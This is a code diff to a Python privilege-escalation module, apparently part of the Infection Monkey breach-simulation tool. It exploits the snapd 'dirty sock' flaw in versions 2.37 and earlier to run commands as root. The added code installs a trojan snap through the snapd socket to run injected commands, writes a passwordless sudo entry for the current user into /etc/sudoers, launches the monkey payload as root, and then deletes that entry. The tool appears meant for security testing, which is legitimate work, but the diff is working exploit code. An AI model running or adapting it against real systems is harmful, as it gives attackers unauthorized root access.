@@ -3,14 +3,16 @@
     https://github.com/Dhayalanb/Snapd-V2
     Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1) It is patched
 """
+import os
 import sys
 import time
 import base64
 import string
 import socket
 import random
+import subprocess
 from logging import getLogger
-from . import HostPrivExploiter
+from infection_monkey.pe import HostPrivExploiter
 
 LOG = getLogger(__name__)
 
@@ -168,32 +170,60 @@ Content-Type: application/octet-stream
     time.sleep(8)
 
 
+def runCommandAsRoot(command):
+    global TROJAN_BASE_SNAP
+    command = command + APPEND_COMMENT
+    index = 108 + len(command)
+    TROJAN_BASE_SNAP_DECODE = TROJAN_BASE_SNAP.decode('base64')
+    TROJAN_SNAP = base64.b64encode("".join(
+        (TROJAN_BASE_SNAP_DECODE[:108], command, TROJAN_BASE_SNAP_DECODE[index:])))
+
+    # Create a random name for the dirty socket file
+    sockfile = create_sockfile()
+
+    # Bind the dirty socket to the snapdapi
+    client_sock = bind_sock(sockfile)
+
+    # Delete trojan snap, in case there was a previous install attempt
+    delete_snap(client_sock)
+
+    # Install the trojan snap, which has an install hook that creates a user
+    install_snap(client_sock, TROJAN_SNAP)
+
+    # Delete the trojan snap
+    delete_snap(client_sock)
+
+    LOG.info("Command Executed Successfully \n")
+
+
 class snapdExploiter(HostPrivExploiter):
     def try_priv_esc(self,command):
         '''
         This function tries pe and if succeeds then we run the command 
         '''
-        global TROJAN_BASE_SNAP
-        command = command + APPEND_COMMENT
-        index = 108 + len(command)
-        TROJAN_BASE_SNAP_DECODE = TROJAN_BASE_SNAP.decode('base64')
-        TROJAN_SNAP = base64.b64encode("".join(
-            (TROJAN_BASE_SNAP_DECODE[:108], command, TROJAN_BASE_SNAP_DECODE[index:])))
+        # get the current user name
+        whoami = os.popen('whoami').read()[:-1]
+        LOG.info("Adding the current user %s to the sudoers list",whoami)
 
-        # Create a random name for the dirty socket file
-        sockfile = create_sockfile()
+        # add the user to the sudo group
+        runMonkeyAsRoot = "echo '%s ALL = NOPASSWD: ALL' | sudo tee -a /etc/sudoers"
+        runCommandAsRoot(runMonkeyAsRoot % whoami)
 
-        # Bind the dirty socket to the snapdapi
-        client_sock = bind_sock(sockfile)
 
-        # Delete trojan snap, in case there was a previous install attempt
-        delete_snap(client_sock)
+        # now run the monkey as root
+        #cmdline = "sudo /home/imonkey/Documents/GitHub/monkey/monkey/infection_monkey/dist/Monkey m0nk3y -s 192.168.1.217:5000"
+        LOG.info("Running the monkey as root ")
+        command = "sudo "+ command
+        monkey_process = subprocess.Popen(command, shell=True,
+                                          stdin=None, stdout=None, stderr=None,
+                                          close_fds=True, creationflags=0)
 
-        # Install the trojan snap, which has an install hook that creates a user
-        install_snap(client_sock, TROJAN_SNAP)
+        LOG.info("Executed monkey process (PID=%d) with command line: %s",
+                 monkey_process.pid, command)
 
-        # Delete the trojan snap
-        delete_snap(client_sock)
+        # now remove the user from sudoers
+        LOG.info("Removing the current user %s from the sudoers list", whoami)
 
-        LOG.info("Command Executed Successfully \n")
+        removesudoers = "sudo sed -i '$ d' /etc/sudoers"
+        runCommandAsRoot(removesudoers)
         return True
